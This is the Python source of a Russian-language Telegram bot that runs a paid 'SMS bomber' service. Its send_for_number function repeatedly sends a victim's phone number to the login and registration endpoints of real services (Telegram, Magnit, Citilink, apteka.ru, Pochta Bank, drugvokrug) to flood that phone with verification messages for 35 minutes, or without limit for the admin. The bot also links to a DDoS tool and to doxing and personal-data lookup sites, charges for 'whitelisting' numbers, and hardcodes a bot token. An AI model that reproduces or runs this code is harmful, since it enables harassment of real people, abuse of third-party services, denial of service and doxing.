import requests
import json
import threading
from datetime import datetime, timedelta
from background import keep_alive #импорт функции для поддержки работоспособности
from functools import wraps
from telebot import TeleBot
from telebot import types
import telebot
import os
import random
import time
import string


TOKEN = '5679696186:AAEvSjLAyMtLsQ3IPvmgwX7iUPwEkjpxDvU'

THREADS_LIMIT = 20 #лимит

ID = 1199404728

my_user_id = '1199404728'

aid = 1199404728

chat_ids_file = 'users.txt'#айди всех пользователей

username = '@Fixxel_lua' #Ник админа

spams = {}

msgs = 4 # Messages in

max = 5 # Seconds

ban = 300 # Seconds

print("╔╗────────╔╗───────────────╔╗\n║╚╗╔═╗╔══╗║╚╗╔═╗╔╦╗        ║╚╗\n║╬║║╬║║║║║║╬║║╩╣║╔╝        ║╬║\n╚═╝╚═╝╚╩╩╝╚═╝╚═╝╚╝─────────╚═╝")

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN, skip_pending=True)
running_spams_per_chat_id = []
xxl = [0]

print("Start telegram bot")

def save_chat_id(chat_id):

    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(chat_id + '\n')
            ids_list.append(chat_id)
            print('New chat_id saved: ' + chat_id)
        else:
            print('chat_id'+ chat_id + 'is already saved')
        users_amount[0] = len(ids_list)
    return

def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }

        response = requests.get('https://api.telegram.org/bot'+TOKEN+'/sendMessage', data=data)
        res = str(response.json)
        print(res)
        if res == '<bound method Response.json of <Response [403]>>':
            with open(chat_ids_file, "r") as f:
                lines = f.readlines()
            with open(chat_ids_file, "w") as f:
                for line in lines:
                    if line.strip("\n") != chat_id:
                        f.write(line)
        else:
            pass

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]


def posts(message):
    f = open("friend.txt", mode="w", encoding="utf-8")
    f.write(message.text)
    f.close()
    bot.send_message(message.chat.id, "Описание партнера успешно обновлено")

def subchan(message):
	f = open('url.txt', mode = 'w', encoding = 'utf-8')
	f.write(message.text)
	f.close()
	bot.send_message(message.chat.id, 'Ссылка обновлена')

def webAppKeyboard(): #создание клавиатуры с webapp кнопкой
   keyboard = types.InlineKeyboardMarkup(row_width=1)
   webAppTest = types.WebAppInfo("https://spammer.gq/webapp") #создаем webappinfo - формат хранения url
   one_butt = types.InlineKeyboardButton(text="Открыть бомбер", web_app=webAppTest) #создаем кнопку типа webapp
   keyboard.add(one_butt) #добавляем кнопки в клавиатуру

   return keyboard #возвращаем клавиатуру

def ddos(): #создание клавиатуры с webapp кнопкой
   dos = types.InlineKeyboardMarkup(row_width=1)
   webApp = types.WebAppInfo("https://spammer.gq/ddos") #создаем webappinfo - формат хранения url
   one_but = types.InlineKeyboardButton(text="Открыть", web_app=webApp) #создаем кнопку типа webapp
   dos.add(one_but) #добавляем кнопки в клавиатуру

   return dos #возвращаем клавиатуру

def probiv(): #создание клавиатуры с webapp кнопкой
   probi = types.InlineKeyboardMarkup(row_width=1)
   webAp = types.WebAppInfo("https://deanon.ml/search") #создаем webappinfo - формат хранения url
   avto = types.WebAppInfo("https://анти-опер.gq/search") #создаем webappinfo - формат хранения url
   lonix = types.WebAppInfo("https://db-lua.cf/lonix") #создаем webappinfo - формат хранения url
   doxbn = types.WebAppInfo("https://doxbin.org/") #создаем webappinfo - формат хранения url
   saveru = types.WebAppInfo("https://saverudata.online/") #создаем webappinfo - формат хранения url
   deanon_but = types.InlineKeyboardButton(text="Поиск в базе мошенников", web_app=webAp) #создаем кнопку типа webapp
   avto_but = types.InlineKeyboardButton(text="Поиск в базе автонарушителей", web_app=avto) #создаем кнопку типа webapp
   lonix_but = types.InlineKeyboardButton(text="Поиск в базе скрипта лоникса", web_app=lonix) #создаем кнопку типа webapp
   doxbin_but = types.InlineKeyboardButton(text="Doxbin", web_app=doxbn) #создаем кнопку типа webapp
   saverudata = types.InlineKeyboardButton(text="SaveRuData(VPN only)", web_app=saveru) #создаем кнопку типа webapp
   probi.add(deanon_but, avto_but, lonix_but, doxbin_but, saverudata) #добавляем кнопки в клавиатуру

   return probi #возвращаем клавиатуру

@bot.message_handler(commands=['web'])
def button_message(message):
    bot.send_message(message.chat.id,'Нажмите на кнопку ниже',reply_markup=webAppKeyboard())

@bot.message_handler(commands=['ddos'])
def button_message(message):
    bot.send_message(message.chat.id,'Нажимите кнопку ниже',reply_markup=ddos())

@bot.message_handler(commands=['search'])
def button_message(message):
    bot.send_message(message.chat.id,'Ииспользуйте кнопки ниже',reply_markup=probiv())

@bot.message_handler(commands=['oplata'])
def button_message(message):
    markup=types.InlineKeyboardMarkup()
    button=types.InlineKeyboardButton('Оплатить',url='https://qiwi.com/n/FIXXEL1337')
    markup.add(button)
    bot.send_message(message.chat.id,'Нажмите на кнопку ниже чтобы оплатить',reply_markup=markup)

@bot.message_handler(commands=['profile'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Проверить блокировку в боте", callback_data="first")
	white_button = types.InlineKeyboardButton(text="Добавить номер в белый список", callback_data="white")
	mail_button = types.InlineKeyboardButton(text="Добавить почту в белый список", callback_data="mail")
	account_button = types.InlineKeyboardButton(text="Купить разблокировку аккаунта", callback_data="account")
	premium_button = types.InlineKeyboardButton(text="⭐Купить премиум подписку", callback_data="premium")
	keyboardmain.add(first_button, white_button, mail_button, account_button, premium_button)
	nick = message.from_user.username
	bot.send_message(message.chat.id, "🧨")
	bot.send_message(message.chat.id, f"Ваш ник: {nick}\nВаш id: {message.chat.id}", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first" and call.message.chat.id == 2096375110:
		bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	elif call.data == "first" and call.message.chat.id == 5298613506:
		bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	elif call.data == "first" and call.message.chat.id == 1132425991:
		bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	elif call.data == "first" and call.message.chat.id == 5436986861:
		bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	elif call.data == "first" and call.message.chat.id == 5175554466:
		bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	elif call.data == "first" and call.message.chat.id == 1131583538:
		bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	elif call.data == "first" and call.message.chat.id == 1815843233:
		bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	elif call.data == "first" and call.message.chat.id == 1036859230:
		bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	#elif call.data == "first" and call.message.chat.id == 5780158285:
		#bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	#elif call.data == "first" and call.message.chat.id == 1766950726:
		#bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	#elif call.data == "first" and call.message.chat.id == 5780158285:
		#bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	#elif call.data == "first" and call.message.chat.id == 5780158285:
		#bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	#elif call.data == "first" and call.message.chat.id == 5780158285:
		#bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	#elif call.data == "first" and call.message.chat.id == 5780158285:
		#bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	#elif call.data == "first" and call.message.chat.id == 5780158285:
		#bot.send_message(call.message.chat.id, 'Блокировка найдена\nВы заблокированы в боте\nПодробности: @Fixxel_lua')
	elif call.data == "white":
		bot.send_message(call.message.chat.id, 'Чтобы добавить номер в белый список переведите 30р на киви по нику FIXXEL1337 (чтобы получить ссылку для оплаты пропишите /oplata) с комментарием "Белый список (номер)" (без ковычек)')
	elif call.data == "mail":
		bot.send_message(call.message.chat.id, 'Чтобы добавить почту в белый список переведите 40р на киви по нику FIXXEL1337 (чтобы получить ссылку для оплаты пропишите /oplata) с комментарием "Белый список (номер)" (без ковычек)')
	elif call.data == "account":
		bot.send_message(call.message.chat.id, f'Чтобы разблокировать аккаунт переведите 60р на киви по нику FIXXEL1337 (чтобы получить ссылку для оплаты пропишите /oplata) с комментарием "Разбан {call.message.chat.id}" (без ковычек)')
	elif call.data == "premium":
		bot.send_message(call.message.chat.id, 'Чтобы получить премиум подписку напишите ему: @Fixxel_lua\nСтоимость: 180р в месяц')
	else:
		bot.send_message(call.message.chat.id, 'Блокировка отсутствует')



@bot.message_handler(commands=['links'])
def button_message(message):
    markup=types.InlineKeyboardMarkup()
    button=types.InlineKeyboardButton('Канал создателя',url='https://t.me/FIXXELPROD')
    button2=types.InlineKeyboardButton('Чат',url='https://t.me/+gYx04LonXRtkZWIy')
    button3 = types.InlineKeyboardButton('Web Bomber',url='https://fixxel.tk/bomber')
    markup.add(button,button2, button3)
    bot.send_message(message.chat.id,'Там вы можете найти актуальную ссылку на меня',reply_markup=markup)

@bot.message_handler(commands=['start'])
def start(message):

	keyboard = types.ReplyKeyboardMarkup(row_width=2,   resize_keyboard=True)
	boom = types.KeyboardButton (text = '💣БОМБЕР')
	stop = types.KeyboardButton (text = '⛔️STOP')
	vip = types.KeyboardButton(text = '⚡Админ панель')
	perm = types.KeyboardButton(text = '⭐Премиум')
	whitelis = types.KeyboardButton(text = '🗂Белый список')
	coma = types.KeyboardButton(text = '👨‍💻Команды')
	info = types.KeyboardButton (text = 'ℹ️Информация')
	stats = types.KeyboardButton (text = '📈Статистика')
	rule = types.KeyboardButton (text = '🗯Правила')
	statis = types.KeyboardButton (text = '🤖 Статус серверов')

	buttons_to_add = [boom, stop, vip, perm, whitelis, coma, info, stats, rule, statis]


	keyboard.add(*buttons_to_add)

	url = open('url.txt', 'r')

	global inl_keyboard
	inl_keyboard = types.InlineKeyboardMarkup()
	s = types.InlineKeyboardButton(text = 'Подписаться', url = url.read())
	inl_keyboard.add(s)

	bot.send_message(message.chat.id, "🎅")
	bot.send_message(message.chat.id, 'Добро пожаловать🙋‍♂!\nВыберите действие на клавиатуре',  reply_markup=keyboard)
	save_chat_id(message.chat.id)



def send_for_number(phone):

	request_timeout = 0.0000002
	phone1 = '+'+phone[0]+' '+'('+phone[1]+phone[2]+phone[3]+')'+" "+phone[4]+phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10]
	phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone [8] + phone[9] + phone[10]
	magnit = 'ee191257-a4fe-4e39-9f0f-079c7f721eee_0'

	try:
		a = requests.get("https://my.telegram.org/auth/send_password/"+phone)
	except Exception as e:
		pass

	try:
		requests.post('https://new.moy.magnit.ru/local/ajax/login/', data={'phone_number': phone, 'ksid': magnit})
	except Exception as e:
		pass

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/*phone', data={'phone': phone, 'ret': '1', 'smsRepeatDelay': '60', 'smsRepeatsDelay': '60', 'smsRepeatsLimit': '5', 'smsRequestToken': 't19d686d-6d80-4297-8909-b11c575627b8'})
	except Exception as e:
		pass

	try:
		requests.post("https://api.apteka.ru/Auth/Auth_Code?cityUrl=moskva", json={'phone': phone , 'u': 'U'}, headers = {
"Accept": "*/*",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
          "Access-Control-Request-Headers": "authorization,content-type",
          "Access-Control-Request-Method": "POST",
          "Connection": "keep-alive",
          "Host": "api.apteka.ru",
          "Origin": "https://apteka.ru",
          "Referer": "https://apteka.ru/",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-site",
          "User-Agent": ""
}
)
	except Exception as e:
		pass


	try:
		requests.post('https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber', json = {'confirmation': 'send', 'phone': phone})
	except Exception as e:
		pass


	try:
		b = requests.session()
		b.get('https://drugvokrug.ru/siteActions/processSms.htm')
		requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+b.cookies['JSESSIONID']+';','Host':'drugvokrug.ru','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
	except Exception as e:
		pass



	#Добавленые сервисы

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = 'Спам запущен на неограниченое время для номера +' + phone_number
    else:
    	mss = random.randint(4,7)
    bot.send_message(chat_id, '⏳ Обрабатываю запрос..')
    time.sleep(mss)
    bot.send_message(chat_id, 'Спам на 35 минут начался\nНаш сайт: https://spammer.gq/\nУбедитесь что номер начинается с 7')
    #bakx += 1
    #print(bakx)
    end = datetime.now() + timedelta(minutes = 35)
    while (datetime.now() < end) or (force and chat_id==1199404728):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    mss = random.randint(4,7)
    bot.send_message(chat_id, '⏳ Обрабатываю запрос..')
    time.sleep(mss)
    bot.send_message(chat_id, 'Спам остановлен\nНаш сайт: https://spammer.gq/')
    xxl[0] -= 1
    THREADS_AMOUNT[0] -= 1
    #bakx -= 1
    #print(bakx)
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите STOP и поробуйте снова')
        return


    if THREADS_AMOUNT[0] < THREADS_LIMIT:
	    x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
	    threads.append(x)
	    xxl[0] += 1
	    THREADS_AMOUNT[0] += 1
	    x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут')
        print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
		keyboard = types.ReplyKeyboardMarkup(row_width=2,   resize_keyboard=True)
		boom = types.KeyboardButton (text = '💣БОМБЕР')
		stop = types.KeyboardButton (text = '⛔️STOP')
		vip = types.KeyboardButton(text = '⚡Админ панель')
		prem = types.KeyboardButton(text = '⭐Премиум')
		whitelis = types.KeyboardButton(text = '🗂Белый список')
		coma = types.KeyboardButton(text = '👨‍💻Команды')
		info = types.KeyboardButton (text = 'ℹ️Информация')
		stats = types.KeyboardButton (text = '📈Статистика')
		rule = types.KeyboardButton (text = '🗯Правила')
		statis = types.KeyboardButton (text = '🤖 Статус серверов')

		buttons_to_add = [boom, stop, vip, prem, whitelis, coma, info, stats, rule, statis]


		keyboard.add(*buttons_to_add)


		url = open('url.txt', 'r')
		inl_keyboard = types.InlineKeyboardMarkup()
		s = types.InlineKeyboardButton(text = 'Подписаться', url = url.read())
		inl_keyboard.add(s)


		adm = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
		a = types.KeyboardButton(text='Рассылка')
		vd = types.KeyboardButton(text='Выдать доступ')
		b = types.KeyboardButton(text='Забрать доступ')
		j = types.KeyboardButton(text='Остановить атаку')
		c = types.KeyboardButton(text='Добавить партнер')
		d = types.KeyboardButton(text='Удалить партнера')
		vpn = types.KeyboardButton(text = 'Обновить VPN')
		sub = types.KeyboardButton(text = 'Изменить ссылку на канал')
		file = types.KeyboardButton(text = 'Dump DB')
		e = types.KeyboardButton(text = 'Назад')
		adm.add(a, vd, b, j, c, d, vpn, sub, file, e)

		chat_id = int(message.chat.id)
		text = message.text



		if text == "Добавить партнер" and chat_id == 1199404728:
			a=bot.send_message(message.chat.id,"Пришлите рекламу вашего партнера:")
			bot.register_next_step_handler(a,posts)

		elif text == 'Забрать доступ' and chat_id == 1199404728:
			idsa = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/bomber/ban.txt").text
			bot.send_message(idsa, 'Вы были заблокированы в боте\nПодробности: @Fixxel_lua')
			bot.send_message(chat_id, f'Сообщение отправлено\nID - {idsa}')

		elif text == 'Выдать доступ' and chat_id == 1199404728:
			idsa = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/bomber/dos.txt").text
			bot.send_message(idsa, 'Блокировка была снята')
			bot.send_message(chat_id, f'Сообщение отправлено\nID - {idsa}')

		elif text == 'Остановить атаку':
			idsa = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/bomber/attack.txt").text
			running_spams_per_chat_id.remove(idsa)
			bot.send_message(chat_id, f'Атака остановлена\nID - {idsa}')

		elif text == 'Изменить ссылку на канал' and chat_id == 1199404728:
			b = bot.send_message(message.chat.id, 'Введите ссылку на канал')
			bot.register_next_step_handler(b, subchan)

		elif text == 'Удалить партнера'and chat_id == 1199404728:
			postsRES()
			bot.send_message(chat_id, 'Партнер удалён')

		elif text == 'ℹ️Информация':
			bot.send_message(chat_id, 'Владелец бота: '+username+'\nПо вопросам обращаться в лс '+username)

		elif text == '🗯Правила':
			bot.send_message(chat_id, 'Правила\n1.1 Запрещено атаковать один и тот же номер с нескольких аккаунтов (бан всех аккаунтов)\n1.2 Запрещено атаковать один и тот же номер без интервала (дайте серверам отдохнуть 2 минуты) (Бан)\n1.3 Запрещено наносить вред боту (ddos, spam, etc)\n1.4 Незнание правил не освобождает от ответственности')
			#bot.send_message(chat_id, 'Правила\n1.1 Запрещено атаковать один и тот же номер с нескольких аккаунтов (бан всех аккаунтов)\n1.2 Запрещено атаковать один и тот же номер без интервала (внесение номера в чёрный список)\n1.3 Администратор всегда прав\n1.4 Если админ не прав прочитайте пункт 1.3\n1.5 Незнание правил не освобождает от ответственности')

		elif text == '79258487986':
			bot.send_message(chat_id, 'Этот номер внесён в чёрный список')

		elif text == '79635843422':
			bot.send_message(chat_id, 'Этот номер внесён в белый список')

		elif text == '79517043303':
			bot.send_message(chat_id, 'Этот номер внесён в белый список')

		elif text == '79516327465':
			bot.send_message(chat_id, 'Этот номер внесён в белый список')

		elif text == '💣БОМБЕР':
			bot.send_message(chat_id, 'Введите номер в формате:\n🇷🇺 79xxxxxxxxx')

		elif text == '⭐Премиум':
			bot.send_message(chat_id, 'Чтобы купить подписку напишите ему - @Fixxel_lua')

		elif text == '🗂Белый список':
			bot.send_message(chat_id, 'Чтобы добавить номер в белый список переведите 30р на киви по нику FIXXEL1337 (чтобы получить ссылку для оплаты пропишите /oplata) с комментарием "Белый список (номер)" (без ковычек)')

		elif text == '👨‍💻Команды':
			bot.send_message(chat_id, '/start - Перезапустить бота\n/links - Получить актуальные ссылки\n/profile - Профиль\n/web - WebApp\n/ddos - Стресс тестирование своего сайта')

		elif text == '📈Статистика':
			with open('chat_ids.txt') as f:
				size=sum(1 for _ in f)
			bot.send_message(chat_id, '📊Статистика:\nПользователей: '+ str(size) +'\nСервисов: 7\nБот запущен: 25.11.2022')

		elif text == '🤖 Статус серверов':
			bot.send_message(message.chat.id, "💣")
			bot.send_message(chat_id, f'Загруженность серверов: {xxl} из [20]')

		elif text == '⚡Админ панель' and chat_id == 1199404728:
			bot.send_message(chat_id, 'Выберите действие.', reply_markup = adm)
		elif text == '⚡Админ панель' and chat_id != 1199404728:
			bot.send_message(chat_id, 'У вас нету доступа к админ панели')

		elif text == '/vip' and chat_id == 1199404728:
			bot.send_message(chat_id, 'Hello')
		elif text == '/vip' and chat_id != 1199404728:
			bot.send_message(chat_id, 'У вас нету доступа к vip')

		elif text == 'Назад' and chat_id == 1199404728:
			bot.send_message(chat_id, 'Выберите действие.', reply_markup = keyboard)

		elif text == 'Рассылка' and chat_id == 1199404728:
			bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

		elif text == 'Обновить VPN' and chat_id == 1199404728:
			bot.send_message(chat_id, 'Бот перезапускается...')
			os.system('python3 bot.py')
			bot.send_message(chat_id, 'Бот успешно перезапущен!')

		elif text == 'Dump DB' and chat_id == 1199404728:
			f = open('chat_ids.txt')
			bot.send_document(chat_id, f)



		elif text == '⛔️STOP':
			if chat_id not in running_spams_per_chat_id:
				bot.send_message(chat_id, 'Вы еще не начинали спам')
			else:
				running_spams_per_chat_id.remove(chat_id)

		elif 'РАЗОСЛАТЬ: ' in text and chat_id==1199404728:
			msg = text.replace("РАЗОСЛАТЬ: ","")
			bot.send_message(message.chat.id, 'Рассылка началась')
			send_message_users(msg)
			bot.send_message(chat_id, 'Рассылка завершена')

		elif len(text) == 11 and text != '79280340844' and text != '79999999999' and text != '79509655506' and chat_id != 2096375110 and chat_id != 1132425991 and chat_id != 5436986861 and chat_id != 5175554466 and chat_id != 1131583538 and chat_id != 5780158285 and chat_id != 1766950726 and chat_id != 1036859230 and chat_id != 1815843233:
			phone = text
			nick = message.from_user.username
			print(chat_id)
			print(nick)
			print(phone)
			bot.send_message(ID, f'Пользователь: @{nick} ({chat_id})\nЗапустил атаку на номер {phone}')
			spam_handler(phone, chat_id, force=False)

		elif len(text) == 12 and string.digits == True:
			phone = text
			bot.send_message(chat_id, 'Номер нужно вводить без +\nЛибо же вы атакуете не Русский номер')

		else:
			bot.send_message(chat_id, 'Номер введен неправильно или же вы заблокированы в боте\nПроверить блокировку можно командой /profile')



if __name__ == '__main__':
    bot.polling(none_stop=True, interval = 2)
